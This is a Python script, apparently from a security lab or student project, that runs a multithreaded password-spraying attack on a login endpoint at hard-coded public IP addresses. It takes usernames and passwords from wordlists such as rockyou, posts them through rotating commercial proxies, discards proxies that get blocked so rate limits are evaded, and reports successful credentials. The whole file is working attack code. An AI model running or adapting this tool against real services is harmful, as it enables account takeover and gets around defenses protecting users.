import os
import requests
from concurrent.futures import ThreadPoolExecutor
import random
import time
import threading
from dotenv import load_dotenv
load_dotenv()

# Lock for synchronized output
# print_lock = threading.Lock()
print("Starting...")

# Set the correct target URL for the login endpoint on your backend
# url = "http://localhost:5050/login"
url = 'http://50.19.17.226:5050/login'
url = 'http://54.234.124.97:5050/login'


# Define Header
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
    'Content-Type': 'application/json'
}

# Map proxies to index
proxiesToIndex = {}
# Proxies List
proxies_list = []

# Function to read the usernames from a file
def read_usernames(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to read the passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Create Proxy from 2 ways: Crawl from web or read from file
# Function to read proxies from a local file
def read_proxies_from_file(file_path):
    proxies_list = []
    with open(file_path, 'r') as file:
        for line in file:
            ip_port, protocol = line.strip().split()
            if protocol.upper() == "HTTP":
                proxies_list.add({
                    "http": f"http://{ip_port}",
                    "https": f"http://{ip_port}"
                })
    return proxies_list

# Function to fetch authenticated proxies from a web API
def fetch_proxies_from_web(api_url, token, proxy_username, proxy_password):
    session = requests.Session()
    session.headers.update({
        "Authorization": f"Token {token}"
    })
    proxies_list = []

    try:
        response = session.get(api_url)
        if response.status_code == 200:
            results = response.json().get("results", [])
            for result in results:
                proxy_address = result.get("proxy_address")
                port = result.get("port")
                # Include the username and password in the proxy URL
                proxies_list.append({
                    "http": f"http://{proxy_username}:{proxy_password}@{proxy_address}:{port}",
                    "https": f"http://{proxy_username}:{proxy_password}@{proxy_address}:{port}"
                })
            print("Fetch Proxy List Success")
        else:
            print("Failed to fetch proxy list from web")
    except requests.RequestException as e:
        print(f"Error fetching proxies from web: {e}")

    return proxies_list


# Create proxy function that decides source based on crawl_from_web parameter
def create_proxy(crawl_from_web=True):
    if crawl_from_web:
        api_url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=25"
        token = os.getenv("PROXY_API_KEY")
        proxy_username = os.getenv("PROXY_API_USERNAME")
        proxy_password = os.getenv("PROXY_API_PASSWORD")
        # print(token)
        return fetch_proxies_from_web(api_url, token, proxy_username, proxy_password)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
        proxy_file_path = os.path.join(base_dir, 'data', 'Proxy', 'proxies3.txt')
        return read_proxies_from_file(proxy_file_path)


# Function to get a random proxy
def get_random_proxy():
    return random.choice(proxies_list)

# Function to delete the proxy list in constant time while
# we still can access random element in constant time
def delete_proxy_in_constant_time(proxy):
    if proxy not in proxiesToIndex:
        return
    try:
        proxyIndex = proxiesToIndex[proxy]
        proxiesToIndex[proxies_list[-1]['http']] = proxyIndex
        # Swap the deleted one to the last one
        proxies_list[proxyIndex], proxies_list[-1] = proxies_list[-1], proxies_list[proxyIndex]
        # Delete the last one
        proxies_list.pop()
        del proxiesToIndex[proxy]
    except KeyError as e:
        print(f"KeyError: {e} - This proxy may not exist in the mapping.")
    except IndexError as e:
        print(f"IndexError: {e} - The proxies list might be empty.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

max_retries = 3
proxies_lock = threading.Lock()

def rotating_proxy(username, password):
    global proxies_list
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Get a random proxy
            # print("hi")
            # print(proxies_list)
            proxies = get_random_proxy()
            # print(proxies)

            # Attempt to log in with the specified proxy and credentials
            login_response = session.post(
                url,
                proxies=proxies,
                json={"username": username, "password": password}
            )

            # Handle response codes
            if login_response.status_code == 200:
                print(f"[+] Successful login with {username}:{password} using proxy {proxies["http"]}")
                return  # Exit on successful login
            elif login_response.status_code == 401:
                # print(f"[-] Failed login for {username}:{password} (401 Unauthorized) using proxy {proxies["http"]}")
                break  # No need to retry on a 401 error
            elif login_response.status_code == 403:
                # print(f"[-] Proxy blocked (403 Forbidden) for {username}:{password} using proxy {proxies["http"]}")
                # Remove the blocked proxy
                with proxies_lock:
                    # proxies_list.remove(proxies)
                    delete_proxy_in_constant_time(proxies["http"])
                retry_count += 1  # Increment retry count after a 403
            else:
                # print(f"[-] Other failure for {username}:{password} (Status Code: {login_response.status_code}) using proxy {proxies["http"]}")
                retry_count += 1

        except requests.RequestException as e:
            print(f"[-] Error with proxy {proxies["http"]} - Username: {username} and Password:{password} - {e}")
            retry_count += 1  # Increment retry count on request error
        except Exception as e:
            # Handle any other exceptions that may occur
            # print(f"[-] An unexpected error occurred - Username: {username} and Password: {password} - {e}")
            retry_count += 1  # Increment retry count on request error

        # Sleep or add a delay if needed
        # time.sleep(1)  # Optional, to avoid immediate re-requests
        # print(len(proxies_list))

    # print(f"Max retries reached for {username}:{password}")


# Function to perform password spraying using multithreading
def password_spray(usernames, passwords):
    # Using ThreadPoolExecutor to manage a pool of threads
    with ThreadPoolExecutor(max_workers=10) as executor:
    # with ThreadPoolExecutor(max_workers=1) as executor:
        # Iterate through each username and try each password
        for username in usernames:
            for password in passwords:
                executor.submit(rotating_proxy, username, password)

# Measure performance with different thread counts
def measure_performance_for_multithreading(num_threads):
    start_time = time.time()

    # Using ThreadPoolExecutor with the specified number of threads
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for username in usernames:
            for password in passwords:
                executor.submit(rotating_proxy, username, password)

    end_time = time.time()
    total_time = end_time - start_time

    print(f"Threads: {num_threads}, Time taken: {total_time:.2f} seconds, Requests per second: {inputSize / total_time:.2f}")

# Run the password spray
if __name__ == "__main__":
    # Get the directory of the current script
    base_dir = os.path.dirname(os.path.abspath(__file__))

    # Build paths relative to the script's directory
    # username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top-usernames.txt')
    # password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'rockyou-500.txt')

    username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
    password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')
    

    # Read the usernames and passwords from files
    usernames = read_usernames(username_file_path)
    passwords = read_passwords(password_file_path)

    inputSize = len(usernames)*len(passwords)

    # Initialize a session
    session = requests.Session()

    # Example usage:
    proxies_list = create_proxy(crawl_from_web=True)  # Set to False to load from file
    # print("List of Proxy")
    # print(proxies_list)
    print("Fetch Proxy List Success!...")

    # Create map to index to delete + print random element in constant time
    proxiesToIndex = {proxy["http"]: index for index, proxy in enumerate(proxies_list)}

    # Run the password spray
    # UNCOMMENT THE CODE TO COUNT PERFORMANCE
    # password_spray(usernames, passwords)
    time.sleep(2)
    print(len(proxies_list))

    for threads in [1,2,5,10,20,50]:
        measure_performance_for_multithreading(threads)
    print(len(proxies_list))
    

    
